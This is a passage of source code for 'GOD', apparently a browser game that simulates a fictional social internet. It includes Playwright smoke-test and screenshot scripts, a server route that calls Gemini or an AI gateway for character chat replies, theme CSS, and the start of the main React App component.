    const ov = await page.evaluate(() => [...document.querySelectorAll("body *")].filter((el) => { const r = el.getBoundingClientRect(); return r.width > 0 && r.right > innerWidth + 2 && getComputedStyle(el).position !== "fixed" && !el.closest("[data-scroll-x], .overflow-x-auto, .overflow-hidden, .overflow-x-hidden"); }).slice(0, 3).map((el) => `${el.tagName}.${String(el.className).slice(0, 60)}`));
    if (ov.length) problems.push(`${label} ${name}: overflow ${ov.join(" | ")}`);
    const shifted = await page.evaluate(() => [...document.querySelectorAll("body *")].filter((el) => el.scrollTop > 0 && !["auto", "scroll"].includes(getComputedStyle(el).overflowY)).slice(0, 3).map((el) => `${el.tagName}.${String(el.className).slice(0, 60)} st=${el.scrollTop}`));
    if (shifted.length) problems.push(`${label} ${name}: clipped container scrolled ${shifted.join(" | ")}`);
    await page.screenshot({ path: `${OUT}${label}-${name}.png` });
  };
  const go = async (h) => { await page.evaluate((x) => { location.hash = x; }, h); await wait(900); };
  await page.goto(`${BASE}/?demo#/lounge/godhq/godhq-general`, { waitUntil: "networkidle" });
  await page.getByPlaceholder("Message #general").waitFor({ timeout: 60000 });
  const cu = page.getByRole("button", { name: "Catch up" }); if (await cu.isVisible().catch(() => false)) await cu.click();
  await go("#/lounge/godhq/godhq-general");
  await step("search", async () => {
    await page.getByRole("button", { name: "Search messages" }).click(); await wait(400);
    await page.getByPlaceholder(/Search/).first().fill("god"); await wait(600);
    const hits = await page.locator("mark").count(); if (!hits) throw new Error("no highlighted search hits");
  });
  await page.keyboard.press("Escape"); await wait(300);
  if (await page.getByRole("button", { name: "Close panel" }).count()) problems.push(`${label}: Escape did not close search`);
  await step("pins", async () => {
    await page.getByRole("button", { name: /^Pinned messages/ }).click(); await wait(500);
    await page.getByRole("button", { name: "Close panel" }).click(); await wait(300);
  });
  await step("send-reply-react-edit", async () => {
    const box = page.getByPlaceholder("Message #general");
    await box.fill("qa check one"); await box.press("Enter"); await wait(800);
    const mine = page.locator('[data-author="god"]').last();
    await mine.click({ position: { x: (await mine.boundingBox()).width - 8, y: 12 } }); await wait(300);
    await page.getByRole("button", { name: "Edit", exact: true }).first().click(); await wait(200);
    await box.fill("qa check edited"); await box.press("Enter"); await wait(800);
    if (!(await page.getByText("qa check edited").count())) throw new Error("edit did not apply");
    const other = page.locator('[data-author^="c"]').last();
    await other.click({ position: { x: (await other.boundingBox()).width - 8, y: 12 } }); await wait(300);
    await page.getByRole("button", { name: "Reply", exact: true }).first().click(); await wait(200);
    await box.fill("replying in qa"); await box.press("Enter"); await wait(800);
    if (!(await page.locator('[data-author="god"][data-reply-author^="c"]').count())) throw new Error("reply not linked");
  });
  await step("thread", async () => {
    const chip = page.getByRole("button", { name: /in thread/ }).first();
    if (await chip.count()) { await chip.click(); await wait(600); }
  });
  await page.keyboard.press("Escape");
  await step("members-dm", async () => {
    await go("#/lounge/godhq/godhq-general");
    if (label === "mobile") { await page.getByRole("button", { name: "Members", exact: true }).click(); await wait(500); }
    await page.getByRole("button", { name: /^Message (?!actions)/ }).first().click(); await wait(900);
    const h = await page.evaluate(() => location.hash); if (!h.includes("dm")) throw new Error(`DM button went to ${h}`);
    const box = page.getByPlaceholder(/Message @/); await box.fill("hey it's me"); await box.press("Enter"); await wait(4500);
  });
  await step("dm-list", async () => { await go("#/lounge/dm"); });
  await step("chirp-like", async () => {
    await go("#/chirp");
    const like = page.getByRole("button", { name: "Like" }).first(); await like.click(); await wait(400);
    if (!(await page.getByRole("button", { name: "Unlike" }).count())) throw new Error("like didn't toggle");
    await page.getByRole("button", { name: /^Reply,/ }).first().click(); await wait(700);
    const h = await page.evaluate(() => location.hash); if (!h.includes("compose=reply")) throw new Error(`reply went to ${h}`);
  });
  await step("platform-sheet", async () => {
    await go("#/platforms/snapgram");
    await page.locator("[role=button]").first().click(); await wait(700);
    if (!(await page.evaluate(() => location.hash)).includes("?p=")) throw new Error("card didn't open");
  });
  await step("global-search", async () => { await go("#/search?q=god"); });
  await step("alerts", async () => { await go("#/alerts"); });
  await step("profile", async () => { await go("#/u/c1"); });
  await step("settings", async () => { await go("#/settings"); });
  await step("events", async () => { await go("#/events"); });
  if (label === "mobile") await step("more-sheet", async () => { await go("#/lounge"); await page.getByRole("button", { name: "More" }).click(); await wait(500); });
  const txt = await page.evaluate(() => document.body.innerText); if (/SIMULATION/.test(txt)) problems.push(`${label}: SIMULATION marker`);
  await ctx.close();
}
await b.close();
console.log(problems.length ? problems.join("\n") : "SMOKE CLEAN");

```

## scripts/screenshots.mjs
```mjs
import { chromium } from "playwright-core";
const BASE = process.env.BASE ?? "http://localhost:3100";
const OUT = new URL("../screenshots/", import.meta.url).pathname;
const browser = await chromium.launch({ executablePath: "/usr/bin/google-chrome", args: ["--no-sandbox"] });
const errors = [];
const PREFIX = process.env.PREFIX; // e.g. "live" to name files live-*
const ONLY = process.env.ONLY; // "mobile" or "desktop"
const markerHits = [];
const checkMarker = async (page, name) => { const t = await page.evaluate(() => document.body.innerText); if (/SIMULATION/.test(t)) markerHits.push(name); };
const wait = (ms) => new Promise((r) => setTimeout(r, ms));
for (const [label, vp] of [["desktop", { width: 1440, height: 900 }], ["mobile", { width: 390, height: 844 }]]) {
  if (ONLY && ONLY !== label) continue;
  const tag = PREFIX ?? label;
  const ctx = await browser.newContext({ viewport: vp, deviceScaleFactor: label === "mobile" ? 2 : 1 });
  const page = await ctx.newPage();
  page.on("pageerror", (e) => errors.push(`${label}: ${e.message}`));
  page.on("console", (m) => { if (m.type() === "error") errors.push(`${label} console: ${m.text()}`); });
  await page.goto(`${BASE}/?demo&away=6h#/lounge`, { waitUntil: "networkidle" });
  await page.getByText(/while you were away/i).first().waitFor({ timeout: 60000 });
  await wait(800);
  await page.screenshot({ path: `${OUT}${tag}-away-summary.png` }); await checkMarker(page, `${tag}-away-summary`);
  await page.getByRole("button", { name: "Catch up" }).click();
  await wait(800);
  const shot = async (hash, name, extra) => {
    await page.evaluate((h) => { location.hash = h; }, hash);
    await wait(1200);
    if (extra) await extra();
    await page.screenshot({ path: `${OUT}${tag}-${name}.png` }); await checkMarker(page, `${tag}-${name}`);
  };
  await shot("#/lounge", "lounge");
  if (label === "mobile") {
    await page.getByRole("button", { name: "Open channels" }).click(); await wait(600);
    await page.screenshot({ path: `${OUT}${tag}-lounge-drawer.png` }); await checkMarker(page, `${tag}-lounge-drawer`);
    await page.mouse.click(370, 400); await wait(500);
    await page.getByRole("button", { name: "Members", exact: true }).click(); await wait(600);
    await page.screenshot({ path: `${OUT}${tag}-lounge-members.png` }); await checkMarker(page, `${tag}-lounge-members`);
    await page.getByRole("button", { name: "Close members" }).click(); await wait(500);
    const msgs = page.locator("section .msg-in, section div.group");
    await msgs.nth(Math.max(0, (await msgs.count()) - 2)).click({ position: { x: 200, y: 20 } }); await wait(500);
    await page.screenshot({ path: `${OUT}${tag}-lounge-actions.png` }); await checkMarker(page, `${tag}-lounge-actions`);
  }
  await shot("#/chirp", "chirp");
  if (label === "desktop") await shot("#/platforms/snapgram", "snapgram");
  await shot("#/dashboard", "dashboard");
  await shot("#/news", "news");
  // open the most recent article
  await page.locator("main button h2, main button h3").first().click();
  await wait(1000);
  await page.screenshot({ path: `${OUT}${tag}-news-article.png` }); await checkMarker(page, `${tag}-news-article`);
  // breaking point
  await shot("#/god", "godmode");
  await page.getByRole("button", { name: /Buy an island/ }).click();
  await page.locator('input[type="range"]').fill("1");
  await page.getByRole("button", { name: "Do it" }).click();
  await page.getByText("BREAKING POINT").first().waitFor({ timeout: 10000 });
  await wait(900);
  await page.screenshot({ path: `${OUT}${tag}-breaking-point.png` }); await checkMarker(page, `${tag}-breaking-point`);
  await page.getByRole("button", { name: "See the reaction" }).click();
  await wait(9000);
  await page.screenshot({ path: `${OUT}${tag}-breaking-chirp.png` }); await checkMarker(page, `${tag}-breaking-chirp`);
  await page.evaluate(() => { location.hash = "#/lounge"; });
  await wait(2500);
  await page.screenshot({ path: `${OUT}${tag}-breaking-lounge.png` }); await checkMarker(page, `${tag}-breaking-lounge`);
  await ctx.close();
}
await browser.close();
console.log(markerHits.length ? `MARKER FOUND in: ${markerHits.join(", ")}` : "no SIMULATION marker on any screen");
console.log(errors.length ? `ERRORS:\n${errors.join("\n")}` : "no page errors");

```

## src/app/api/chat/route.ts
```ts
import { generateText } from "ai";
import { instructions, parseReply, promptText, sanitize, type LiveRequest } from "@/lib/live/prompt";

export const runtime = "nodejs";
export const maxDuration = 20;

/** Order: Google Gemini direct (GEMINI_API_KEY), else AI Gateway; the client falls back to scripted replies on any failure. */

/** Model is configurable; default is a fast, cheap one. Auth: Vercel OIDC (automatic on Vercel) or AI_GATEWAY_API_KEY. */
const MODEL = process.env.AI_GATEWAY_MODEL || "google/gemini-2.5-flash-lite";
const FALLBACKS = (process.env.AI_GATEWAY_FALLBACKS ?? "openai/gpt-4.1-nano").split(",").map((x) => x.trim()).filter(Boolean);

// best-effort per-instance rate limit (each serverless instance keeps its own window)
const WINDOW = 60_000, PER_IP = 30;
const hits = new Map<string, number[]>();
function limited(ip: string) {
  const now = Date.now();
  const h = (hits.get(ip) ?? []).filter((t) => now - t < WINDOW);
  if (h.length >= PER_IP) { hits.set(ip, h); return true; }
  h.push(now);
  hits.set(ip, h);
  if (hits.size > 5000) hits.clear();
  return false;
}

function errCode(e: unknown): { status: number; code: string } {
  const s = String((e as { message?: string })?.message ?? e).toLowerCase();
  const st = Number((e as { statusCode?: number })?.statusCode) || 0;
  if (s.includes("customer_verification_required") || s.includes("verification") || s.includes("credit card")) return { status: 402, code: "customer_verification_required" };
  if (st === 402 || s.includes("insufficient")) return { status: 402, code: "insufficient_funds" };
  if (st === 401 || st === 403 || s.includes("unauthenticated") || s.includes("api key") || s.includes("oidc")) return { status: 401, code: "no_auth" };
  if (st === 429 || s.includes("rate")) return { status: 429, code: "rate_limited" };
  if (s.includes("timeout") || s.includes("abort")) return { status: 504, code: "timeout" };
  return { status: 502, code: "model_error" };
}

/** direct Google Gemini call (server only; the key never leaves the server) */
const GEMINI_MODELS = (process.env.GEMINI_MODEL ?? "gemini-3.6-flash,gemini-3.1-flash-lite,gemini-flash-lite-latest,gemini-3.5-flash-lite").split(",").map((x) => x.trim()).filter(Boolean);
class HttpError extends Error { constructor(public statusCode: number, msg: string) { super(msg); } }
async function gemini(r: LiveRequest, key: string, model: string, ms: number, outer: AbortSignal) {
  const ctl = new AbortController();
  const timer = setTimeout(() => ctl.abort(), ms);
  outer.addEventListener("abort", () => ctl.abort());
  try {
    const res = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/${encodeURIComponent(model)}:generateContent`, {
      method: "POST", signal: ctl.signal,
      headers: { "content-type": "application/json", "x-goog-api-key": key },
      body: JSON.stringify({
        systemInstruction: { parts: [{ text: instructions(r) }] },
        contents: [{ role: "user", parts: [{ text: promptText(r) }] }],
        generationConfig: { temperature: 1, maxOutputTokens: 300, responseMimeType: "application/json", thinkingConfig: { thinkingLevel: "minimal" } },
        safetySettings: ["HARM_CATEGORY_HARASSMENT", "HARM_CATEGORY_HATE_SPEECH", "HARM_CATEGORY_SEXUALLY_EXPLICIT", "HARM_CATEGORY_DANGEROUS_CONTENT"].map((category) => ({ category, threshold: "BLOCK_MEDIUM_AND_ABOVE" })),
      }),
    });
    const j = (await res.json().catch(() => ({}))) as { error?: { status?: string; message?: string }; candidates?: { content?: { parts?: { text?: string; thought?: boolean }[] } }[]; usageMetadata?: { promptTokenCount?: number; candidatesTokenCount?: number } };
    if (!res.ok) throw new HttpError(res.status, `gemini ${res.status} ${j.error?.status ?? ""}`);
    const text = (j.candidates?.[0]?.content?.parts ?? []).filter((x) => !x.thought).map((x) => x.text ?? "").join("");
    return { text, model, usage: { in: j.usageMetadata?.promptTokenCount ?? 0, out: j.usageMetadata?.candidatesTokenCount ?? 0 } };
  } finally { clearTimeout(timer); }
}

export async function POST(req: Request) {
  const ip = (req.headers.get("x-forwarded-for") ?? "local").split(",")[0].trim();
  if (limited(ip)) return Response.json({ error: "slow down", code: "rate_limited" }, { status: 429 });
  let body: unknown;
  try { body = await req.json(); } catch { return Response.json({ error: "bad json", code: "bad_request" }, { status: 400 }); }
  if (JSON.stringify(body ?? null).length > 24_000) return Response.json({ error: "too big", code: "bad_request" }, { status: 413 });
  const r = sanitize(body);
  if (!r) return Response.json({ error: "missing fields", code: "bad_request" }, { status: 400 });
  const key = process.env.GEMINI_API_KEY;
  if (key) {
    // Google latency swings a lot: ask two fast models at once and take the first usable answer
    const ctl = new AbortController();
    const ask = async (model: string, ms: number) => {
      const out = await gemini(r, key, model, ms, ctl.signal);
      const { lines, remember } = parseReply(out.text, r.persona.username);
      if (!lines.length) throw new Error("empty");
      return { lines, remember, model: out.model, usage: out.usage };
    };
    let errs: unknown[] = [];
    try {
      const won = await Promise.any(GEMINI_MODELS.slice(0, 2).map((m) => ask(m, 9_000)));
      ctl.abort();
      return Response.json(won);
    } catch (e) {
      errs = e instanceof AggregateError ? [...e.errors] : [e];
    }
    // Both fast models failed (often a brief per-model rate limit): try the backups one at a time
    if (!errs.some((x) => errCode(x).code === "no_auth")) {
      for (const m of GEMINI_MODELS.slice(2)) {
        try { return Response.json(await ask(m, 3_500)); } catch (e) { errs.push(e); }
      }
    }
    const c = errCode(errs.find((x) => errCode(x).code === "no_auth") ?? errs[0]);
    console.error("chat route (gemini):", c.code, errs.map((x) => String((x as Error)?.message ?? x).slice(0, 80)).join(" | "));
    return Response.json({ error: "model unavailable", code: c.code, status: c.status }, { status: c.code === "no_auth" ? 200 : c.status });
  }
  try {
    const out = await generateText({
      model: MODEL,
      instructions: instructions(r),
      prompt: promptText(r),
      maxOutputTokens: 300,
      temperature: 1,
      maxRetries: 0,
      timeout: 8000,
      providerOptions: { gateway: { models: FALLBACKS } },
    });
    const { lines, remember } = parseReply(out.text, r.persona.username);
    if (!lines.length) return Response.json({ error: "empty", code: "empty" }, { status: 502 });
    return Response.json({ lines, remember, model: out.response?.modelId ?? MODEL, usage: { in: out.usage?.inputTokens ?? 0, out: out.usage?.outputTokens ?? 0 } });
  } catch (e) {
    const c = errCode(e);
    console.error("chat route:", c.code, String((e as Error)?.message ?? e).slice(0, 300));
    // short, scrubbed reason (no secrets): helps tell "needs a payment method" apart from "no credentials"
    const detail = String((e as Error)?.message ?? e).replace(/[A-Za-z0-9_\-]{32,}/g, "[redacted]").slice(0, 200);
    // setup problems (no card / no key / no funds) are expected states, not request failures: answer 200 so the
    // browser does not log a red error on every page; the client switches to the built-in replies for the session
    const setup = c.code === "customer_verification_required" || c.code === "insufficient_funds" || c.code === "no_auth";
    return Response.json({ error: "model unavailable", code: c.code, status: c.status, detail }, { status: setup ? 200 : c.status });
  }
}

```

## src/app/globals.css
```css
@import "tailwindcss";

:root,
[data-theme="midnight"] {
  --bg: #08090d;
  --surface: #0f1117;
  --surface-2: #161923;
  --surface-3: #1d2130;
  --border: #222636;
  --text: #e8e9ee;
  --muted: #8b90a1;
  --up: #2bd17e;
  --down: #f2555f;
  --sim: #f0b429;
  --brand: #7d8cff;
  --gold: #e8b84a;
  --glow: 125 140 255;
}
[data-theme="obsidian"] {
  --bg: #050505;
  --surface: #0d0d0d;
  --surface-2: #151515;
  --surface-3: #1c1c1c;
  --border: #262626;
  --text: #ededed;
  --muted: #8f8f8f;
  --brand: #a3a3ff;
  --gold: #d4af6a;
  --glow: 212 175 106;
}
[data-theme="royal"] {
  --bg: #0b0714;
  --surface: #130d22;
  --surface-2: #1b1330;
  --surface-3: #241a3e;
  --border: #2e2248;
  --text: #efe9fb;
  --muted: #a397bd;
  --brand: #b48cff;
  --gold: #f2c45a;
  --glow: 180 140 255;
}
[data-theme="terminal"] {
  --bg: #040806;
  --surface: #08100b;
  --surface-2: #0d1811;
  --surface-3: #122117;
  --border: #1a2e20;
  --text: #d7f5e0;
  --muted: #7fa58b;
  --brand: #3ee07f;
  --gold: #f5c84c;
  --glow: 62 224 127;
}

@theme inline {
  --color-bg: var(--bg);
  --color-surface: var(--surface);
  --color-surface-2: var(--surface-2);
  --color-surface-3: var(--surface-3);
  --color-line: var(--border);
  --color-fg: var(--text);
  --color-muted: var(--muted);
  --color-up: var(--up);
  --color-down: var(--down);
  --color-sim: var(--sim);
  --color-brand: var(--brand);
  --color-gold: var(--gold);
  --font-sans: var(--font-geist-sans);
  --font-mono: var(--font-geist-mono);
}

html,
body {
  background: var(--bg);
  color: var(--text);
  height: 100%;
}
body {
  font-family: var(--font-geist-sans), ui-sans-serif, system-ui, sans-serif;
  font-feature-settings: "cv11" 1;
  overscroll-behavior: none;
}
.num {
  font-family: var(--font-geist-mono), ui-monospace, monospace;
  font-variant-numeric: tabular-nums;
}
.panel {
  background: var(--surface);
  border: 1px solid var(--border);
  border-radius: 14px;
}
.glass {
  background: color-mix(in oklab, var(--surface) 82%, transparent);
  backdrop-filter: blur(14px);
}
.gold-text {
  background: linear-gradient(100deg, #fff3c4, var(--gold) 45%, #9a7020);
  -webkit-background-clip: text;
  background-clip: text;
  color: transparent;
}
.glow {
  box-shadow: 0 0 0 1px rgb(var(--glow) / 0.25), 0 10px 40px -10px rgb(var(--glow) / 0.35);
}
.btn {
  display: inline-flex;
  align-items: center;
  gap: 0.4rem;
  border-radius: 10px;
  padding: 0.5rem 0.85rem;
  font-size: 13px;
  font-weight: 600;
  background: var(--surface-3);
  border: 1px solid var(--border);
  transition: transform 0.08s, background 0.15s;
}
.btn:hover { background: color-mix(in oklab, var(--surface-3) 70%, var(--brand) 12%); }
.btn:active { transform: scale(0.97); }
.btn-gold {
  background: linear-gradient(180deg, #f3d27a, #c9961a);
  color: #1a1204;
  border-color: #f3d27a55;
}
.btn-gold:hover { background: linear-gradient(180deg, #f7dc92, #d6a22a); }
.input {
  width: 100%;
  background: var(--surface-2);
  border: 1px solid var(--border);
  border-radius: 10px;
  padding: 0.55rem 0.75rem;
  font-size: 14px;
  outline: none;
}
.input:focus { border-color: var(--brand); }
.scroll-thin::-webkit-scrollbar { width: 8px; height: 8px; }
::-webkit-scrollbar { width: 8px; height: 8px; }
::-webkit-scrollbar-thumb { background: var(--surface-3); border-radius: 8px; }
::-webkit-scrollbar-track { background: transparent; }
.no-scrollbar::-webkit-scrollbar { display: none; }

@keyframes msg-in { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: none; } }
.msg-in { animation: msg-in 0.35s ease-out both; }
@keyframes pop { 0% { transform: scale(0.85); opacity: 0; } 60% { transform: scale(1.03); opacity: 1; } 100% { transform: scale(1); } }
.pop { animation: pop 0.45s cubic-bezier(0.2, 0.9, 0.3, 1.2) both; }
@keyframes ticker { from { transform: translateX(0); } to { transform: translateX(-50%); } }
.ticker { animation: ticker 60s linear infinite; }
@keyframes shake { 0%, 100% { transform: none; } 20% { transform: translate(-2px, 1px); } 40% { transform: translate(2px, -1px); } 60% { transform: translate(-1px, 2px); } 80% { transform: translate(1px, -2px); } }
.shake { animation: shake 0.5s ease-in-out 2; }
@keyframes breaking-pulse { 0%, 100% { box-shadow: 0 0 0 0 rgb(242 85 95 / 0.5); } 50% { box-shadow: 0 0 0 14px rgb(242 85 95 / 0); } }
.breaking-pulse { animation: breaking-pulse 1.6s infinite; }
[data-motion="reduced"] *, [data-motion="reduced"] *::before { animation: none !important; transition: none !important; }
.typing-dots { display: inline-flex; gap: 3px; }
.typing-dots i { width: 5px; height: 5px; border-radius: 9999px; background: currentColor; opacity: 0.4; animation: typing 1.1s infinite ease-in-out; }
.typing-dots i:nth-child(2) { animation-delay: 0.15s; }
.typing-dots i:nth-child(3) { animation-delay: 0.3s; }
@keyframes typing { 0%, 80%, 100% { transform: translateY(0); opacity: 0.35; } 40% { transform: translateY(-3px); opacity: 1; } }

@keyframes sheet-up { from { transform: translateY(100%); } to { transform: none; } }
.sheet-up { animation: sheet-up 0.32s cubic-bezier(0.2, 0.8, 0.2, 1) both; }
@keyframes react-pop { 0% { transform: scale(0.6); } 55% { transform: scale(1.18); } 100% { transform: scale(1); } }
.react-pop { animation: react-pop 0.32s cubic-bezier(0.2, 0.9, 0.3, 1.3) both; }
@keyframes flash-gold { 0% { background: rgb(var(--glow) / 0.28); } 100% { background: transparent; } }
.flash-gold { animation: flash-gold 1.8s ease-out both; }
@keyframes badge-bump { 0% { transform: scale(1); } 40% { transform: scale(1.35); } 100% { transform: scale(1); } }
.badge-bump { animation: badge-bump 0.4s ease-out; }
.row-cv { content-visibility: auto; contain-intrinsic-size: auto 56px; }
[data-motion="reduced"] .sheet-up, [data-motion="reduced"] .react-pop, [data-motion="reduced"] .flash-gold, [data-motion="reduced"] .badge-bump { animation: none; }
@media (prefers-reduced-motion: reduce) { .sheet-up, .react-pop, .flash-gold, .badge-bump, .msg-in, .pop { animation: none; } }
.vc-speaking { box-shadow: 0 0 0 2px var(--up, #3ddc84), 0 0 10px 1px rgb(61 220 132 / 0.45); transition: box-shadow 0.15s; }
.vc-banner { background: linear-gradient(90deg, transparent, rgb(var(--glow) / 0.14), transparent); }
@keyframes vc-wave { 0%, 100% { transform: scaleY(0.35); } 50% { transform: scaleY(1); } }
.vc-wave i { display: inline-block; width: 3px; height: 12px; margin: 0 1px; border-radius: 2px; background: var(--gold); animation: vc-wave 0.9s infinite ease-in-out; transform-origin: center; }
.vc-wave i:nth-child(2) { animation-delay: 0.15s; } .vc-wave i:nth-child(3) { animation-delay: 0.3s; } .vc-wave i:nth-child(4) { animation-delay: 0.45s; }
@media (prefers-reduced-motion: reduce) { .vc-wave i { animation: none; } }

```

## src/app/layout.tsx
```tsx
import type { Metadata, Viewport } from "next";
import { Geist, Geist_Mono } from "next/font/google";
import "./globals.css";

const geistSans = Geist({ variable: "--font-geist-sans", subsets: ["latin"] });
const geistMono = Geist_Mono({ variable: "--font-geist-mono", subsets: ["latin"] });

export const metadata: Metadata = {
  title: "GOD",
  description: "A fictional, simulated internet where @god is the main character. All people, platforms, companies and events are invented. Runs locally in your browser.",
  applicationName: "GOD",
  appleWebApp: { capable: true, title: "GOD", statusBarStyle: "black-translucent" },
  formatDetection: { telephone: false },
};

export const viewport: Viewport = { themeColor: "#08090d", width: "device-width", initialScale: 1, viewportFit: "cover" };

export default function RootLayout({ children }: { children: React.ReactNode }) {
  return (
    <html lang="en" data-theme="midnight" className={`${geistSans.variable} ${geistMono.variable} h-full antialiased`}>
      <body className="h-full overflow-hidden">{children}</body>
    </html>
  );
}

```

## src/app/manifest.ts
```ts
import type { MetadataRoute } from "next";

export default function manifest(): MetadataRoute.Manifest {
  return {
    name: "GOD",
    short_name: "GOD",
    description: "A fictional internet where @god is the main character.",
    start_url: "/",
    scope: "/",
    display: "standalone",
    orientation: "portrait",
    background_color: "#08090d",
    theme_color: "#08090d",
    categories: ["games", "entertainment"],
    icons: [
      { src: "/icon-192.png", sizes: "192x192", type: "image/png", purpose: "any" },
      { src: "/icon-512.png", sizes: "512x512", type: "image/png", purpose: "any" },
      { src: "/icon-maskable-512.png", sizes: "512x512", type: "image/png", purpose: "maskable" },
    ],
  };
}

```

## src/app/page.tsx
```tsx
import { App } from "@/components/App";

export default function Page() {
  return <App />;
}

```

## src/components/App.tsx
```tsx
"use client";
import clsx from "clsx";
import { useEffect, useMemo, useState } from "react";
import { Bell, Crown, Globe2, LayoutDashboard, MessagesSquare, Newspaper, Search, Settings as Cog, Zap, Feather, Lock, MoreHorizontal, X } from "lucide-react";
import { init, lock, useApp, takeOverHere } from "./store";
import { go, Money } from "./ui";
import { netWorth } from "@/lib/sim/world";
import { trending, unreadIndex } from "@/lib/sim/engine";
import { fmtCount } from "@/lib/sim/format";
import { Lounge } from "./views/Lounge";
import { Chirp } from "./views/Chirp";
import { Platforms } from "./views/Platforms";
import { News } from "./views/News";
import { Dashboard } from "./views/Dashboard";
import { GodMode } from "./views/GodMode";
import { Events } from "./views/Events";
import { SearchView } from "./views/Search";
import { Alerts } from "./views/Alerts";
import { ProfileView } from "./views/Profile";
import { SettingsView } from "./views/Settings";
import { AuthScreen, CatchUpScreen } from "./views/Auth";
import { AwaySummary, BreakingOverlay, Toast } from "./views/Overlays";

export type Route = { view: string; parts: string[]; query: URLSearchParams };
function parse(): Route {
  const h = typeof location === "undefined" ? "" : location.hash.replace(/^#\/?/, "");
  const [path, q] = h.split("?");
  const parts = path.split("/").filter(Boolean).map(decodeURIComponent);
  return { view: parts[0] ?? "lounge", parts: parts.slice(1), query: new URLSearchParams(q ?? "") };
}
function useRoute() {
  const [r, setR] = useState<Route>({ view: "lounge", parts: [], query: new URLSearchParams() });
  useEffect(() => {
    const f = () => { setR(parse()); };
    f();
    window.addEventListener("hashchange", f);
    return () => window.removeEventListener("hashchange", f);
  }, []);
  return r;
}

const NAV = [
  { id: "lounge", label: "Lounge", icon: MessagesSquare },
  { id: "chirp", label: "Chirp", icon: Feather },
  { id: "platforms", label: "Platforms", icon: Globe2 },
  { id: "news", label: "News", icon: Newspaper },
  { id: "dashboard", label: "Empire", icon: LayoutDashboard },
  { id: "god", label: "GOD MODE", icon: Crown },
  { id: "events", label: "Events", icon: Zap },
  { id: "search", label: "Search", icon: Search },
  { id: "alerts", label: "Alerts", icon: Bell },
  { id: "settings", label: "Settings", icon: Cog },
];
const MOBILE = ["lounge", "chirp", "news", "god"];

export function App() {
  const app = useApp();
  const route = useRoute();
  const [more, setMore] = useState(false);
  useEffect(() => { init(); }, []);
  const w = app.world;
  useEffect(() => {
    if (!w) return;
    document.documentElement.dataset.theme = w.settings.theme;
    document.documentElement.dataset.motion = w.settings.reducedMotion ? "reduced" : "full";
  }, [w, w?.settings.theme, w?.settings.reducedMotion]);

  if (app.phase === "boot") return <Splash />;
  if (app.phase === "profiles") return <AuthScreen />;
  if (app.phase === "elsewhere") return <Elsewhere />;
  if (app.phase === "catchup" || !w) return <CatchUpScreen progress={app.progress} />;

  const now = app.now;
  const openEvents = w.events.filter((e) => !e.resolved && e.t <= now && e.expiresAt > now).length;
  const unreadAlerts = w.notifications.filter((n) => !n.read && n.t <= now).length;
  const badge: Record<string, number> = { events: openEvents, alerts: unreadAlerts };
  const lounge = unreadIndex(w, now, app.lastRead, now - 15 * 60e3);
  let mentions = 0; for (const u of lounge.values()) mentions += u.mentions;
  badge.lounge = mentions;
  const moreBadge = NAV.filter((n) => !MOBILE.includes(n.id)).reduce((a, n) => a + (badge[n.id] ?? 0), 0);

  let body: React.ReactNode;
  switch (route.view) {
    case "chirp": body = <Chirp route={route} />; break;
    case "platforms": body = <Platforms route={route} />; break;
    case "news": body = <News route={route} />; break;
    case "dashboard": body = <Dashboard />; break;
    case "god": body = <GodMode />; break;
    case "events": body = <Events />; break;
    case "search": body = <SearchView route={route} />; break;
    case "alerts": body = <Alerts />; break;
    case "u": body = <ProfileView id={route.parts[0]} />; break;
    case "settings": body = <SettingsView />; break;
    default: body = <Lounge route={route} />;
  }

  return (
    <div className="flex h-dvh flex-col">
      <TopBar />
      <div className="flex min-h-0 flex-1">
        <nav className="hidden w-[76px] shrink-0 flex-col items-center gap-1 border-r border-line bg-surface py-3 md:flex lg:w-[200px] lg:items-stretch lg:px-3">
          {NAV.map((n) => {
            const active = route.view === n.id || (n.id === "lounge" && !NAV.some((x) => x.id === route.view) && route.view !== "u");
            return (
              <button key={n.id} aria-label={n.label} aria-current={active ? "page" : undefined} onClick={() => go(`/${n.id}`)} className={clsx("group relative flex items-center gap-3 rounded-xl px-3 py-2.5 text-[13px] font-medium transition", active ? "bg-surface-3 text-fg" : "text-muted hover:bg-surface-2 hover:text-fg", n.id === "god" && "text-gold")}>
                <n.icon className="size-5 shrink-0" />
                <span className="hidden lg:inline">{n.label}</span>
                {badge[n.id] ? <span className="absolute right-1.5 top-1.5 rounded-full bg-down px-1.5 text-[10px] font-bold text-white lg:static lg:ml-auto">{badge[n.id]}</span> : null}
              </button>
            );
          })}
          <div className="mt-auto hidden lg:block">
            <button onClick={lock} className="flex w-full items-center gap-3 rounded-xl px-3 py-2 text-[12px] text-muted hover:bg-surface-2"><Lock className="size-4" /> Lock / switch profile</button>
          </div>
        </nav>
        <main className="min-w-0 flex-1 overflow-hidden">{body}</main>
      </div>
      <nav className="flex shrink-0 border-t border-line bg-surface pb-[env(safe-area-inset-bottom)] md:hidden">
        {NAV.filter((n) => MOBILE.includes(n.id)).map((n) => (
          <button key={n.id} onClick={() => { haptic(); go(`/${n.id}`); }} aria-current={route.view === n.id ? "page" : undefined} className={clsx("relative flex min-h-[52px] flex-1 flex-col items-center justify-center gap-0.5 text-[10px] transition-colors active:scale-95", route.view === n.id ? "text-fg" : "text-muted", n.id === "god" && "text-gold")}>
            <n.icon className="size-5" />
            {n.label === "GOD MODE" ? "GOD" : n.label}
            {badge[n.id] ? <span data-badge={n.id} className="absolute right-[22%] top-1.5 min-w-4 rounded-full bg-down px-1 text-center text-[9px] font-bold leading-4 text-white">{badge[n.id] > 99 ? "99+" : badge[n.id]}</span> : null}
            {route.view === n.id && <span className="absolute top-0 h-0.5 w-8 rounded-full bg-gold" />}
          </button>
        ))}
        <button onClick={() => { haptic(); setMore(true); }} aria-label="More" className={clsx("relative flex min-h-[52px] flex-1 flex-col items-center justify-center gap-0.5 text-[10px] active:scale-95", !MOBILE.includes(route.view) && route.view !== "u" ? "text-fg" : "text-muted")}>
          <MoreHorizontal className="size-5" />More
          {moreBadge > 0 && <span data-badge="more" className="absolute right-[22%] top-1.5 min-w-4 rounded-full bg-down px-1 text-center text-[9px] font-bold leading-4 text-white">{moreBadge > 99 ? "99+" : moreBadge}</span>}
        </button>
      </nav>
      {more && (
        <div className="fixed inset-0 z-50 md:hidden" onClick={() => setMore(false)}>
          <div className="absolute inset-0 bg-black/60 backdrop-blur-[2px]" />
